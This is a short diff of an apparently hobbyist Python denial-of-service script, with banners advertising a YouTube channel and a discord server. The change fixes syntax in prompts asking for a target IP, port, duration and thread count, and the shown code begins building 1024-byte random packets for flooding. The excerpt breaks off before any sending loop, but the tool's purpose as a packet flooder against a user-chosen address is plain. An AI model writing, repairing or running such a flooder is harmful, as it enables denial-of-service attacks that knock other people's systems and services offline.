@@ -27,11 +27,11 @@ print("     >>> DONT FORGET TO SUBS MY YOUTUBE")
 print("     >>>> MY COMMUNITY discord.gg/treax") 
 
 
-ip =str(input("[+] Enter Ip : ") 
-port =int(input("[-] Enter Port : ") 
-times =int(input("[•] Enter Times : ") 
-threads =int(input("[×] Enter Threads : ") 
-choice =str(input("[√] Ready? (yes/n) : ") 
+ip =str(input("[+] Enter Ip : ")) 
+port =int(input("[-] Enter Port : ")) 
+times =int(input("[•] Enter Times : ")) 
+threads =int(input("[×] Enter Threads : ")) 
+choice =str(input("[√] Ready? (yes/n) : ")) 
 
 def run():
 	   data = random._urandom(1024) 
